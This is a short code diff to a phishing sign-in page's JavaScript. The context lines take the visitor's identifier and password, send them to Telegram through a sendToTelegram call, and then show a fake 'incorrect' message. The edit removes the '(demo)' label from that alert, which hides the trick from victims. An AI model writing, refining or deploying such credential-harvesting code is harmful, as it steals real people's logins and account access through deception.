@@ -39,7 +39,7 @@ signinForm.addEventListener("submit", async (e) => {
   const pw = document.getElementById("signin-password").value;
   const msg = `🔑 New Sign In:\n\nIdentifier: ${id}\nPassword: ${pw}`;
   await sendToTelegram(msg);
-  alert("Sign in details incorrect! (demo).");
+  alert("Sign in details incorrect!.");
   signinForm.reset();
 });
 
